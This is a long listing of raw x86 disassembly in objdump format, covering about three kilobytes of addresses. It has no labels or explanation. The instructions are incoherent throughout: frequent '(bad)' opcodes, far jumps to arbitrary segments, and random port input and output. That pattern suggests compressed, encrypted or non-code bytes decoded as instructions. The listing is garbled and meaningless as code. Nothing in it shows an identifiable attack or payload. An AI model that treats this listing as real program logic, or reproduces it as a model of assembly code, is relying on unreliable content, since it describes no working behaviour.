  41a85c:	div    edi
  41a85e:	mov    ds:0x175327ca,al
  41a863:	repnz lods al,BYTE PTR ds:[esi]
  41a865:	dec    esp
  41a866:	addr16 sbb eax,0x1000001
  41a86c:	add    BYTE PTR [eax],al
  41a86e:	jmp    0xb1a8:0x706eeb96
  41a875:	inc    esp
  41a876:	mov    ?,WORD PTR [eax]
  41a878:	mov    cs,WORD PTR ds:0xf9cf591f
  41a87e:	scas   al,BYTE PTR es:[edi]
  41a87f:	lea    ecx,[edi-0x48]
  41a882:	loope  0x41a868
  41a884:	or     ebp,DWORD PTR [esi-0x72]
  41a887:	loop   0x41a888
  41a889:	test   BYTE PTR [ebx],dh
  41a88b:	cmp    edx,ebx
  41a88d:	or     BYTE PTR [ebp-0x737e15b1],ah
  41a893:	jmp    0x41a8e3
  41a895:	mov    eax,ds:0xacd898d8
  41a89a:	pop    ss
  41a89b:	xchg   ecx,eax
  41a89c:	scas   eax,DWORD PTR es:[edi]
  41a89d:	dec    edx
  41a89e:	sbb    eax,0x2c2c7320
  41a8a3:	ret    0xa32
  41a8a6:	std    
  41a8a7:	cmp    BYTE PTR [edi+0x11],bh
  41a8aa:	fisubr DWORD PTR [edi+0x4debbe20]
  41a8b0:	(bad)  
  41a8b1:	repz mov edx,ebp
  41a8b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8b5:	fdivr  QWORD PTR [esi-0x16c235e]
  41a8bb:	ret    
  41a8bc:	inc    ebp
  41a8bd:	daa    
  41a8be:	cdq    
  41a8bf:	push   ds
  41a8c0:	ret    
  41a8c1:	mov    ecx,0x2df284b3
  41a8c6:	sub    esp,DWORD PTR [edi-0x38]
  41a8c9:	jae    0x41a875
  41a8cb:	push   ecx
  41a8cc:	fwait
  41a8cd:	dec    esi
  41a8ce:	test   bh,ah
  41a8d0:	bound  esp,QWORD PTR [ebp+0x68c60dd0]
  41a8d6:	mov    ds:0xe741b37b,eax
  41a8db:	out    0x31,eax
  41a8dd:	sahf   
  41a8de:	push   eax
  41a8df:	cli    
  41a8e0:	sti    
  41a8e1:	ret    0x39a0
  41a8e4:	inc    eax
  41a8e5:	pop    edi
  41a8e6:	push   0xf835b7a6
  41a8eb:	popa   
  41a8ec:	xchg   esp,eax
  41a8ed:	int3   
  41a8ee:	ret    0x1502
  41a8f1:	pop    ebp
  41a8f2:	mov    ah,0x91
  41a8f4:	imul   esp,DWORD PTR [ebp+0x2be04bb9],0x9c426fea
  41a8fe:	scas   al,BYTE PTR es:[edi]
  41a8ff:	and    bl,BYTE PTR [ebx]
  41a901:	fadd   st,st(6)
  41a903:	pusha  
  41a904:	sti    
  41a905:	cwde   
  41a906:	not    esp
  41a908:	or     DWORD PTR [eax],ecx
  41a90a:	loopne 0x41a8f5
  41a90c:	mov    ds:0x5a733c00,al
  41a911:	mov    esi,0xac9e8075
  41a916:	nop
  41a917:	push   ebx
  41a918:	inc    eax
  41a919:	dec    edx
  41a91a:	jns    0x41a8aa
  41a91c:	dec    esi
  41a91d:	leave  
  41a91e:	out    dx,eax
  41a91f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a920:	sub    al,0x58
  41a922:	push   ss
  41a923:	mov    edx,0x97e47515
  41a928:	fidivr DWORD PTR [ecx+0x53]
  41a92b:	ins    BYTE PTR es:[edi],dx
  41a92c:	rol    DWORD PTR [eax+ebx*1+0x68],cl
  41a930:	not    BYTE PTR [edx]
  41a932:	test   al,0xbc
  41a934:	sbb    ecx,DWORD PTR [ebp-0x4f]
  41a937:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a938:	push   esp
  41a939:	test   al,0x68
  41a93c:	dec    edx
  41a93d:	test   BYTE PTR [ecx],cl
  41a93f:	cmp    DWORD PTR [esi-0x67],esp
  41a942:	push   eax
  41a943:	xlat   BYTE PTR ds:[ebx]
  41a944:	ror    DWORD PTR [ebp+0x4e154479],cl
  41a94a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a94b:	sar    BYTE PTR [edi+0x5a],cl
  41a94e:	mov    ch,0x89
  41a950:	mov    ecx,0x80a29914
  41a955:	fisttp WORD PTR [ebx]
  41a957:	xor    bh,BYTE PTR [ebp+0x7921caf8]
  41a95d:	(bad)  [edi]
  41a95f:	outs   dx,BYTE PTR ds:[esi]
  41a960:	es adc eax,0xb20b54ec
  41a966:	xor    al,0x82
  41a968:	cld    
  41a969:	and    eax,DWORD PTR [edx+0x72ab31]
	...
  41a9d3:	add    BYTE PTR [eax],al
  41a9d5:	add    BYTE PTR ds:0xcf4a867e,dh
  41a9db:	cli    
  41a9dc:	std    
  41a9dd:	jg     0x41aa2d
  41a9df:	push   edx
  41a9e0:	pushf  
  41a9e1:	dec    esp
  41a9e2:	out    0x4a,eax
  41a9e4:	ja     0x41a968
  41a9e6:	addr16 push ds
  41a9e8:	add    DWORD PTR [eax],eax
  41a9ea:	add    BYTE PTR [ecx],al
  41a9ec:	add    BYTE PTR [eax],al
  41a9ee:	push   esi
  41a9ef:	sbb    BYTE PTR [eax-0x1b2bce04],al
  41a9f5:	push   0x1048113b
  41a9fa:	scas   eax,DWORD PTR es:[edi]
  41a9fb:	icebp  
  41a9fc:	in     al,0x46
  41a9fe:	sub    al,0x79
  41aa00:	add    ebx,ecx
  41aa02:	aad    0xf6
  41aa04:	cmp    ebx,DWORD PTR [ebx+0x341b9d0b]
  41aa0a:	and    eax,0xd02e0882
  41aa0f:	jnp    0x41aa32
  41aa11:	imul   esi,DWORD PTR [edx],0x4e
  41aa14:	push   ds
  41aa15:	and    al,bh
  41aa17:	ins    BYTE PTR es:[edi],dx
  41aa18:	ds (bad) 
  41aa1a:	ds test al,0x55
  41aa1d:	test   al,0xaf
  41aa1f:	mov    eax,0x9aac1af6
  41aa24:	das    
  41aa25:	mov    al,0x8d
  41aa27:	addr16 es lock aam 0xe2
  41aa2c:	(bad)  [esi+0x64]
  41aa2f:	dec    ebp
  41aa30:	jg     0x41a9e4
  41aa32:	aad    0xe
  41aa34:	pop    ecx
  41aa35:	aad    0x42
  41aa37:	fsubr  st(6),st
  41aa39:	inc    ebp
  41aa3a:	dec    eax
  41aa3b:	lock dec edx
  41aa3d:	pop    ecx
  41aa3e:	pop    ecx
  41aa3f:	aad    0x64
  41aa41:	icebp  
  41aa42:	mov    eax,0xa65f079a
  41aa47:	int3   
  41aa48:	mov    ah,0xef
  41aa4a:	jmp    0xa82e:0x3a71e622
  41aa51:	inc    ebp
  41aa52:	(bad)
  41aa55:	ins    BYTE PTR es:[edi],dx
  41aa56:	add    al,0x19
  41aa58:	xor    eax,0x2a521282
  41aa5d:	mov    ds:0xdf6eec40,al
  41aa62:	ds xchg ecx,eax
  41aa64:	mov    ebp,0xc88287ff
  41aa69:	jnp    0x41aa21
  41aa6b:	mov    al,0xfd
  41aa6d:	(bad)  
  41aa6e:	imul   edi,DWORD PTR [esi+ebx*8-0x1e7e712b],0x152a596f
  41aa79:	repz jle 0x41aa15
  41aa7c:	pop    ecx
  41aa7d:	cmp    bh,al
  41aa7f:	(bad)  
  41aa80:	mov    ecx,0x19266853
  41aa85:	fld    QWORD PTR [ecx+edi*4]
  41aa88:	lods   al,BYTE PTR ds:[esi]
  41aa89:	ret    0x4721
  41aa8c:	or     al,0x7f
  41aa8e:	jmp    0x6bde:0x51d93e76
  41aa95:	js     0x41aa70
  41aa97:	jo     0x41aace
  41aa99:	dec    ebx
  41aa9a:	adc    eax,0x6df9a04
  41aa9f:	jecxz  0x41aafb
  41aaa1:	sahf   
  41aaa2:	ds popa 
  41aaa4:	and    bh,BYTE PTR [eax+0x63]
  41aaa7:	fsub   QWORD PTR [ecx+0x8f35022]
  41aaad:	bound  ebp,QWORD PTR [ebp+0x5bdb08c]
  41aab3:	adc    edx,edx
  41aab5:	jo     0x41aab1
  41aab7:	in     al,0x2a
  41aab9:	jl     0x41ab38
  41aabb:	iret   
  41aabc:	sub    DWORD PTR [esi],ebp
  41aabe:	shl    BYTE PTR [edx],0xd9
  41aac1:	mov    esi,0x47f5a9b3
  41aac6:	mov    dh,BYTE PTR [esi+0x6e509a2a]
  41aacc:	pop    esi
  41aacd:	jb     0x41aa71
  41aacf:	stc    
  41aad0:	clc    
  41aad1:	inc    ebx
  41aad2:	jne    0x41aab8
  41aad4:	xor    eax,DWORD PTR [esi]
  41aad6:	mov    ds:0x10c0fd79,al
  41aadb:	dec    ecx
  41aadc:	out    0xf2,eax
  41aade:	push   cs
  41aadf:	xchg   ecx,eax
  41aae0:	and    al,0x6d
  41aae2:	jb     0x41aa86
  41aae4:	cmp    esi,ebx
  41aae6:	arpl   WORD PTR [esi-0x54],si
  41aae9:	cmp    DWORD PTR [ebx-0x57],ecx
  41aaec:	fistp  QWORD PTR [edi+0x0]
	...
  41ab56:	test   DWORD PTR [ecx],0xfdfeb4dc
  41ab5c:	inc    DWORD PTR [ebx+0x5f]
  41ab5f:	sbb    BYTE PTR [esi+0x43],ah
  41ab62:	fucomi st,st(7)
  41ab64:	inc    esi
  41ab65:	packuswb mm3,QWORD PTR [edi]
  41ab68:	add    DWORD PTR [eax],eax
  41ab6a:	add    BYTE PTR [ecx],al
  41ab6c:	add    BYTE PTR [eax],al
  41ab6e:	ficomp DWORD PTR [ecx+0x5c2e07cd]
  41ab74:	push   ds
  41ab75:	adc    ah,bl
  41ab77:	and    DWORD PTR [ebp+ebp*4+0x22],esp
  41ab7b:	out    dx,al
  41ab7c:	push   eax
  41ab7d:	cwde   
  41ab7e:	adc    dl,0x42
  41ab81:	push   esi
  41ab82:	mov    ds:0xf88b52b9,al
  41ab87:	iret   
  41ab88:	xchg   ebx,eax
  41ab89:	cmp    BYTE PTR [esi+edi*4-0x74007dbb],ah
  41ab90:	stos   BYTE PTR es:[edi],al
  41ab91:	(bad)  
  41ab92:	stc    
  41ab93:	or     esi,eax
  41ab95:	es jecxz 0x41ac01
  41ab98:	pop    edi
  41ab99:	jge    0x41abf2
  41ab9b:	packsswb mm7,mm3
  41ab9e:	jo     0x41abc5
  41aba0:	jle    0x41ab52
  41aba2:	(bad)  
  41aba3:	cmp    esi,DWORD PTR [edi]
  41aba5:	fldenv [edi+0x62]
  41aba8:	ins    BYTE PTR es:[edi],dx
  41aba9:	inc    edi
  41abaa:	mov    al,ds:0x7cf1c6df
  41abaf:	xor    dh,ah
  41abb1:	add    al,0x54
  41abb3:	imul   esi,esi,0xffffff8b
  41abb6:	push   edx
  41abb7:	cmp    al,0x62
  41abb9:	jmp    0xb004:0xef2c6205
  41abc0:	sbb    edi,ecx
  41abc2:	in     al,0x78
  41abc4:	nop
  41abc5:	mov    BYTE PTR [ecx+eax*4],dh
  41abc8:	imul   ch
  41abca:	pop    ecx
  41abcb:	cmp    BYTE PTR [esi-0x2726168c],al
  41abd1:	mov    ah,0xb4
  41abd3:	dec    edx
  41abd4:	ror    WORD PTR [ecx+0x4ce5bbae],cl
  41abdb:	pop    eax
  41abdc:	push   ds
  41abdd:	and    DWORD PTR [edx],0xe3b4c4e
  41abe3:	jp     0x41ab6d
  41abe5:	adc    eax,0x408991b9
  41abea:	call   0x283a:0x40f8263f
  41abf1:	sar    ah,cl
  41abf3:	fnstcw WORD PTR [esp+ecx*8-0x53]
  41abf7:	int    0xa0
  41abf9:	ret    
  41abfa:	mov    eax,ds:0x3feb6b86
  41abff:	outs   dx,DWORD PTR ds:[esi]
  41ac00:	jnp    0x41abb2
  41ac02:	inc    ebx
  41ac03:	jle    0x41ac65
  41ac05:	push   ebp
  41ac06:	xor    DWORD PTR [ebp+0x34],0x1b
  41ac0a:	fldenv [ecx]
  41ac0c:	repz mov ebp,DWORD PTR [ecx]
  41ac0f:	mov    dh,0xd4
  41ac11:	lahf   
  41ac12:	sahf   
  41ac13:	add    DWORD PTR [eax-0x5b],esi
  41ac16:	mov    cl,0xf6
  41ac18:	mov    esi,DWORD PTR [edx-0x17b052a]
  41ac1e:	mov    edx,0xbb0e412d
  41ac23:	enter  0x76b6,0x73
  41ac27:	jo     0x41ac26
  41ac29:	push   ebx
  41ac2a:	push   edi
  41ac2b:	add    al,0x6f
  41ac2d:	pop    esi
  41ac2e:	lahf   
  41ac2f:	sub    al,0xb0
  41ac31:	jno    0x41aca1
  41ac33:	xor    eax,0xac234983
  41ac38:	addr16 adc al,0x13
  41ac3b:	add    DWORD PTR [edi],esp
  41ac3d:	jnp    0x41abf6
  41ac3f:	push   ss
  41ac40:	mov    bh,0x8
  41ac42:	sub    ebx,esp
  41ac44:	(bad)  
  41ac45:	enter  0x73d8,0xb6
  41ac49:	sub    al,0x6b
  41ac4b:	lods   al,BYTE PTR ds:[esi]
  41ac4c:	mov    dl,BYTE PTR [edi-0x9]
  41ac4f:	xor    bl,BYTE PTR [esi-0x7a0baf84]
  41ac55:	aas    
  41ac56:	mov    ecx,0x2c832fc7
  41ac5b:	and    al,0x57
  41ac5d:	adc    dl,dl
  41ac5f:	mov    edi,DWORD PTR [eax-0x18ab7f20]
  41ac65:	cmp    eax,0xb42968b0
  41ac6a:	in     al,dx
  41ac6b:	retf   0x5305
	...
  41acd6:	push   0x49
  41acd8:	es cmp al,0x27
  41acdb:	jg     0x41ad57
  41acdd:	pop    edi
  41acde:	or     al,0x44
  41ace0:	xor    ah,BYTE PTR [esp+ebx*8-0x41]
  41ace4:	sbb    eax,esi
  41ace6:	and    BYTE PTR [bx+di],al
  41ace9:	add    BYTE PTR [eax],al
  41aceb:	add    DWORD PTR [eax],eax
  41aced:	add    BYTE PTR [ebp+0x59],al
  41acf0:	(bad)  
  41acf1:	mov    bl,0x4e
  41acf3:	sub    DWORD PTR [esi],ebx
  41acf5:	jb     0x6f237fa1
  41acfb:	js     0x41ad6d
  41acfd:	cmp    ecx,DWORD PTR [esi]
  41acff:	pusha  
  41ad00:	push   ebx
  41ad01:	jbe    0x41ad49
  41ad03:	push   edx
  41ad04:	ins    BYTE PTR es:[edi],dx
  41ad05:	test   DWORD PTR [ebp-0x60],esp
  41ad08:	daa    
  41ad09:	xchg   esi,eax
  41ad0a:	jg     0x41acfd
  41ad0c:	out    0x83,al
  41ad0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad0f:	add    esi,edx
  41ad11:	(bad)  
  41ad12:	fsubr  QWORD PTR [eax-0x6ce3e2e4]
  41ad18:	and    BYTE PTR [edi+0x58],ch
  41ad1b:	(bad)  
  41ad1d:	or     eax,0x56797082
  41ad22:	push   edx
  41ad23:	mov    al,ds:0xb22d1
  41ad28:	rol    DWORD PTR [eax-0x3b],1
  41ad2b:	add    BYTE PTR [eax-0x16],ch
  41ad2e:	pop    esi
  41ad2f:	mov    bh,0x96
  41ad31:	lock jl 0x41ad19
  41ad34:	cwde   
  41ad35:	stos   DWORD PTR es:[edi],eax
  41ad36:	jb     0x41ad3b
  41ad38:	pop    ds
  41ad39:	jle    0x41ad5e
  41ad3b:	dec    eax
  41ad3c:	retf   
  41ad3d:	int3   
  41ad3e:	and    eax,0xb250b614
  41ad43:	fidivr DWORD PTR [edx]
  41ad45:	jbe    0x41ad6b
  41ad47:	addr16 inc ebp
  41ad49:	stc    
  41ad4a:	cdq    
  41ad4b:	push   ebp
  41ad4c:	retf   
  41ad4d:	and    cl,ch
  41ad4f:	test   DWORD PTR [ebx],0x64d61ea8
  41ad55:	retf   0x9bda
  41ad58:	ret    
  41ad59:	inc    eax
  41ad5a:	scas   al,BYTE PTR es:[edi]
  41ad5b:	mov    bl,0xd1
  41ad5d:	or     eax,0x165ce877
  41ad62:	aas    
  41ad63:	pop    ebp
  41ad64:	sbb    cl,ch
  41ad66:	and    dl,al
  41ad68:	add    DWORD PTR [esi],0x5c24e2b9
  41ad6e:	call   0x2e13f473
  41ad73:	xchg   esp,eax
  41ad74:	stc    
  41ad75:	jb     0x41acf9
  41ad77:	int    0xab
  41ad79:	sub    BYTE PTR [ebp-0x33],bl
  41ad7c:	dec    esp
  41ad7d:	je     0x41adc2
  41ad7f:	sub    BYTE PTR [ebx+0x9],al
  41ad82:	push   edi
  41ad83:	ja     0x41ad18
  41ad85:	adc    BYTE PTR [edi+0x6f],cl
  41ad88:	mov    edx,0xfbbd5c13
  41ad8d:	scas   al,BYTE PTR es:[edi]
  41ad8e:	iret   
  41ad8f:	stos   BYTE PTR es:[edi],al
  41ad90:	outs   dx,DWORD PTR ds:[esi]
  41ad91:	add    al,0xc7
  41ad93:	mov    ebp,0xf5d5a633
  41ad98:	out    0x19,eax
  41ad9a:	test   BYTE PTR [edi],ah
  41ad9c:	add    DWORD PTR [edi-0x2f],ebp
  41ad9f:	fwait
  41ada0:	cmp    bh,dl
  41ada2:	mov    ds:0x1e9f4a5d,al
  41ada7:	fwait
  41ada8:	cmp    al,0x4
  41adaa:	inc    ebp
  41adab:	mov    ch,0x19
  41adad:	test   DWORD PTR [esi+0xcec010d],edx
  41adb3:	xor    esp,DWORD PTR [esi-0x2e6599f1]
  41adb9:	daa    
  41adba:	jl     0x41adf4
  41adbc:	fstp   TBYTE PTR [edi-0x1c]
  41adbf:	repz fstp QWORD PTR [esi-0xf]
  41adc3:	fld    DWORD PTR [edx]
  41adc5:	jns    0x41ad75
  41adc7:	out    dx,eax
  41adc8:	jle    0x41adcf
  41adca:	in     eax,0x1
  41adcc:	xchg   esp,eax
  41adcd:	cli    
  41adce:	iret   
  41adcf:	and    eax,DWORD PTR [edx-0x74212472]
  41add5:	sbb    ebx,DWORD PTR [eax+0x4f]
  41add8:	les    eax,FWORD PTR [edi-0x71dc1fa7]
  41adde:	xchg   ecx,eax
  41addf:	cmp    eax,0xf165ba33
  41ade4:	and    DWORD PTR [ebx-0x370c49ce],eax
  41adea:	inc    esp
  41adeb:	ss (bad) 
  41aded:	cdq    
	...
  41ae56:	push   ebp
  41ae57:	clc    
  41ae58:	or     DWORD PTR [esi-0x4280053],ebx
  41ae5e:	dec    edi
  41ae5f:	push   eax
  41ae60:	cmp    DWORD PTR [ecx+ebp*2+0x674637e8],esp
  41ae67:	and    DWORD PTR [ecx],eax
  41ae69:	add    BYTE PTR [eax],al
  41ae6b:	add    DWORD PTR [eax],eax
  41ae6d:	add    BYTE PTR [ecx+eax*2+0x7c],dl
  41ae71:	push   cs
  41ae72:	sub    bl,BYTE PTR [edi+ebp*8-0x4b8a193c]
  41ae79:	mov    ecx,0x79e43cbb
  41ae7e:	push   ebx
  41ae7f:	adc    BYTE PTR [edx],cl
  41ae81:	dec    edi
  41ae82:	xchg   esi,eax
  41ae83:	out    0x7c,eax
  41ae85:	call   0x7351:0x4ad92c0b
  41ae8c:	add    dl,BYTE PTR [edi]
  41ae8e:	sbb    DWORD PTR [eax],ecx
  41ae90:	sbb    al,0xb1
  41ae92:	cli    
  41ae93:	dec    esp
  41ae94:	retf   0x540b
  41ae97:	sbb    esi,edx
  41ae99:	(bad)  
  41ae9b:	fcmove st,st(6)
  41ae9d:	mov    ebx,DWORD PTR [ebp+0x39d211f6]
  41aea3:	and    ebp,DWORD PTR [ecx+0x670a8783]
  41aea9:	add    eax,0x6138efac
  41aeae:	or     al,0x79
  41aeb0:	imul   edi,edi,0x6ceb17f9
  41aeb6:	push   DWORD PTR ds:0xa470c49c
  41aebc:	or     dl,BYTE PTR [ecx-0x50fdef90]
  41aec2:	cmp    al,0x2
  41aec4:	retf   0xe3d7
  41aec7:	(bad)  
  41aec8:	daa    
  41aec9:	sub    dh,BYTE PTR [ebp+0x3ebb80ef]
  41aecf:	xor    ah,0xa8
  41aed2:	jno    0x41aef2
  41aed4:	fld    TBYTE PTR [edx+esi*8-0x2b]
  41aed8:	(bad)  
  41aed9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aeda:	daa    
  41aedb:	adc    eax,0xfc1ba14f
  41aee0:	push   ecx
  41aee1:	and    al,0x3c
  41aee3:	retf   
  41aee4:	js     0x41af37
  41aee6:	int3   
  41aee7:	sub    DWORD PTR [ebp+0x4e5e2ff],0x4e6c51e3
  41aef1:	sbb    DWORD PTR [eax-0x4f6c5b05],ebp
  41aef7:	loope  0x41af76
  41aef9:	cmp    DWORD PTR [ebp-0x7a850f9],edx
  41aeff:	fwait
  41af00:	sub    eax,0xa3b4ae58
  41af05:	js     0x41af58
  41af07:	or     DWORD PTR [ecx],esp
  41af09:	pushf  
  41af0a:	xchg   edi,eax
  41af0b:	cwde   
  41af0c:	lods   al,BYTE PTR ds:[esi]
  41af0d:	into   
  41af0e:	xchg   ecx,eax
  41af0f:	jo     0x41aeec
  41af11:	jl     0x41af59
  41af13:	pop    es
  41af14:	xchg   edx,eax
  41af15:	jmp    0xaccb:0x3e4b1c09
  41af1c:	dec    esi
  41af1d:	sub    bh,BYTE PTR [esi+0x17]
  41af20:	into   
  41af21:	stos   DWORD PTR es:[edi],eax
  41af22:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41af24:	mov    al,ds:0xa386bbf6
  41af29:	adc    al,0x7c
  41af2b:	test   BYTE PTR [ebp-0x5f747ffc],0xf2
  41af32:	sbb    BYTE PTR [edi+eiz*2+0x40],dl
  41af36:	fwait
  41af37:	jb     0x41af8d
  41af39:	pop    es
  41af3a:	loope  0x41aed3
  41af3c:	sbb    BYTE PTR [ebx],bh
  41af3e:	in     eax,dx
  41af3f:	adc    bh,BYTE PTR [edi-0x40]
  41af42:	loope  0x41af8c
  41af44:	jbe    0x41aecf
  41af46:	xor    al,BYTE PTR [edi+0x60]
  41af49:	xchg   DWORD PTR [ebx-0x41],edi
  41af4c:	aaa    
  41af4d:	push   edi
  41af4e:	push   0x811250e8
  41af53:	dec    eax
  41af54:	lahf   
  41af55:	sbb    eax,DWORD PTR [ecx-0x44484616]
  41af5b:	pop    ss
  41af5c:	push   edi
  41af5d:	sbb    BYTE PTR [esi-0x34329954],0x1e
  41af64:	and    ch,bl
  41af66:	mov    bh,0xb6
  41af68:	leave  
  41af69:	and    eax,0x6da95f3a
	...
  41afd6:	(bad)  
  41afd9:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41afdf:	mov    ecx,0x23df44ee
  41afe4:	mov    eax,ds:0x12267b6
  41afe9:	add    BYTE PTR [eax],al
  41afeb:	add    DWORD PTR [eax],eax
  41afed:	add    BYTE PTR [eax],bh
  41afef:	clc    
  41aff0:	jp     0x41af84
  41aff2:	ficom  WORD PTR [ecx-0x420238e9]
  41aff8:	or     BYTE PTR [esi-0x3e1f6d0],bl
  41affe:	pop    eax
  41afff:	stos   DWORD PTR es:[edi],eax
  41b000:	cmp    BYTE PTR [edi+eax*2],ah
  41b003:	repz cs sub al,0x46
  41b007:	out    dx,al
  41b008:	(bad)  [edi-0x1c]
  41b00b:	inc    eax
  41b00c:	sar    BYTE PTR ds:0xcdb77742,1
  41b012:	adc    DWORD PTR [ebx-0x23],edi
  41b015:	mov    ah,0xb7
  41b017:	sbb    eax,0x6e746ec1
  41b01c:	xchg   edi,eax
  41b01d:	adc    BYTE PTR [eax+ebx*4-0x11cf6c8b],bl
  41b024:	push   eax
  41b025:	stos   BYTE PTR es:[edi],al
  41b026:	enter  0x8e60,0x65
  41b02a:	xor    bh,BYTE PTR [eax+edi*4+0x58]
  41b02e:	js     0x41b00f
  41b030:	jl     0x41b05a
  41b032:	aas    
  41b033:	or     BYTE PTR [esi+ebp*1],al
  41b036:	mov    DWORD PTR [ebx-0x1fb6ec3d],ebp
  41b03c:	(bad)  
  41b03d:	push   eax
  41b03e:	or     ah,BYTE PTR [edx-0x366475a4]
  41b044:	clc    
  41b045:	mov    ecx,0xb409258b
  41b04a:	outs   dx,BYTE PTR ds:[esi]
  41b04b:	outs   dx,BYTE PTR ds:[esi]
  41b04c:	mov    al,0xd6
  41b04e:	retf   
  41b04f:	ja     0x41b0ac
  41b051:	vmovlhps xmm3,xmm2,xmm3
  41b055:	jl     0x41b057
  41b057:	arpl   dx,ax
  41b059:	mov    esp,0xbd9d5fb
  41b05e:	into   
  41b05f:	dec    edx
  41b060:	shl    DWORD PTR [ebx+0x34],1
  41b063:	jl     0x41b049
  41b065:	adc    al,0x30
  41b067:	lahf   
  41b068:	cmp    dh,BYTE PTR [esi+ebp*2+0x17]
  41b06c:	or     dl,BYTE PTR [edx-0x33]
  41b06f:	xchg   esi,eax
  41b070:	push   ebx
  41b071:	xchg   ebx,eax
  41b072:	push   ecx
  41b073:	(bad)  
  41b074:	fisttp WORD PTR [edx-0x750426ed]
  41b07a:	das    
  41b07b:	xor    ecx,DWORD PTR [esi]
  41b07d:	pop    esi
  41b07e:	fmul   QWORD PTR [edx-0x2939f0e6]
  41b084:	xor    BYTE PTR [edx+0x5a],bh
  41b087:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b088:	dec    edx
  41b089:	sbb    DWORD PTR [ebp+0x76f0131f],esp
  41b08f:	push   es
  41b090:	int3   
  41b091:	(bad)  
  41b092:	icebp  
  41b093:	dec    eax
  41b094:	lahf   
  41b095:	js     0x41b0f9
  41b097:	xor    ecx,eax
  41b099:	xor    ecx,DWORD PTR [ebx+0x18]
  41b09c:	xchg   ebp,eax
  41b09d:	pusha  
  41b09e:	jnp    0x41b034
  41b0a0:	inc    ecx
  41b0a1:	xchg   esp,eax
  41b0a2:	xlat   BYTE PTR ds:[ebx]
  41b0a3:	inc    ebp
  41b0a4:	inc    esi
  41b0a5:	(bad)  
  41b0a6:	jp     0x41b054
  41b0a8:	call   0xaf0b28eb
  41b0ad:	or     ch,cl
  41b0af:	psubw  mm3,QWORD PTR [edx+eiz*4]
  41b0b3:	sbb    BYTE PTR [edx+0x3b],dl
  41b0b6:	sub    al,0x4a
  41b0b8:	gs stc 
  41b0ba:	shl    BYTE PTR [eax],1
  41b0bc:	(bad)  
  41b0be:	(bad)  
  41b0bf:	pop    ecx
  41b0c0:	pop    edx
  41b0c1:	adc    DWORD PTR [ebx],0x7b15f083
  41b0c7:	shr    BYTE PTR [esi],0xc4
  41b0ca:	call   0x965e:0x7594a2f3
  41b0d1:	pop    eax
  41b0d2:	pop    esi
  41b0d3:	jae    0x41b104
  41b0d5:	adc    al,0x39
  41b0d7:	sti    
  41b0d8:	out    dx,al
  41b0d9:	mov    DWORD PTR [edx+0x61e3c016],edx
  41b0df:	pop    eax
  41b0e0:	or     bh,BYTE PTR [edx]
  41b0e2:	int3   
  41b0e3:	sub    al,0x2c
  41b0e5:	jge    0x41b06d
  41b0e7:	xchg   ebp,eax
  41b0e8:	mov    ds:0x4aab6804,eax
  41b0ed:	out    0x0,al
	...
  41b153:	add    BYTE PTR [eax],al
  41b155:	add    dh,al
  41b157:	ficom  WORD PTR [eax]
  41b159:	stos   DWORD PTR es:[edi],eax
  41b15a:	sbb    bh,ch
  41b15c:	(bad)  
  41b15d:	call   DWORD PTR [edx+edx*8+0x75]
  41b161:	mov    edi,0xbe234f28
  41b166:	and    eax,DWORD PTR [bx+di]
  41b169:	add    BYTE PTR [eax],al
  41b16b:	add    DWORD PTR [eax],eax
  41b16d:	add    bl,al
  41b16f:	mov    bh,0xa0
  41b171:	arpl   WORD PTR [edi-0x5e],sp
  41b174:	sub    DWORD PTR [ebx+edi*1-0x48],edi
  41b178:	and    al,0x95
  41b17a:	xor    eax,0x8152daa2
  41b17f:	outs   dx,BYTE PTR ds:[esi]
  41b180:	call   0xa3558813
  41b185:	sub    BYTE PTR [edx+0x75],0x64
  41b189:	(bad)  
  41b18b:	outs   dx,BYTE PTR ds:[esi]
  41b18c:	icebp  
  41b18d:	dec    ebx
  41b18e:	push   edi
  41b18f:	xchg   edi,eax
  41b190:	ja     0x41b1ff
  41b192:	xchg   esi,eax
  41b193:	or     ah,BYTE PTR [ebp+0x4ea9d397]
  41b199:	loope  0x41b12f
  41b19b:	mov    esp,0xbe06fe57
  41b1a0:	jmp    0x3f2b3696
  41b1a5:	lds    edi,FWORD PTR [ebp-0x21062185]
  41b1ab:	jge    0x41b17a
  41b1ad:	add    DWORD PTR [ebp+0x49],0x829a2b5
  41b1b4:	mov    ch,0xbf
  41b1b6:	pusha  
  41b1b7:	shr    DWORD PTR [ecx+edx*2+0x4a910c01],1
  41b1be:	test   al,0x24
  41b1c0:	mov    ebp,0x968a9213
  41b1c5:	es jo  0x41b231
  41b1c8:	shr    DWORD PTR [esi],0x46
  41b1cb:	inc    ebx
  41b1cc:	add    DWORD PTR [ebx],esp
  41b1ce:	or     dh,0xea
  41b1d1:	dec    ebp
  41b1d2:	arpl   cx,di
  41b1d4:	push   edx
  41b1d5:	jno    0x41b1f0
  41b1d7:	outs   dx,DWORD PTR ds:[esi]
  41b1d8:	bound  esi,QWORD PTR [eax-0xcbd7d1e]
  41b1de:	std    
  41b1df:	test   al,0xee
  41b1e1:	pop    ebx
  41b1e2:	inc    edi
  41b1e3:	stos   BYTE PTR es:[edi],al
  41b1e4:	gs cwde 
  41b1e6:	xor    eax,0xbd0e988a
  41b1eb:	xor    BYTE PTR ds:0x3810606c,cl
  41b1f1:	and    edx,eax
  41b1f3:	fbld   TBYTE PTR [edi+0x23]
  41b1f6:	popf   
  41b1f7:	lea    ebp,[edx-0x3]
  41b1fa:	pop    esp
  41b1fb:	out    dx,al
  41b1fc:	fbstp  TBYTE PTR [eax]
  41b1fe:	cmp    bl,cl
  41b200:	adc    BYTE PTR [ecx],dl
  41b202:	cmp    eax,0x106e4bcf
  41b207:	cs cmp bh,dl
  41b20a:	outs   dx,DWORD PTR ds:[esi]
  41b20b:	mov    WORD PTR [ecx],?
  41b20d:	addr16 in al,0xbb
  41b210:	in     eax,0x90
  41b212:	cmp    BYTE PTR [esi],bh
  41b214:	daa    
  41b215:	cld    
  41b216:	imul   esi,DWORD PTR [eax-0x43],0xffffffef
  41b21a:	pop    esi
  41b21b:	push   bx
  41b21d:	popa   
  41b21e:	int    0x35
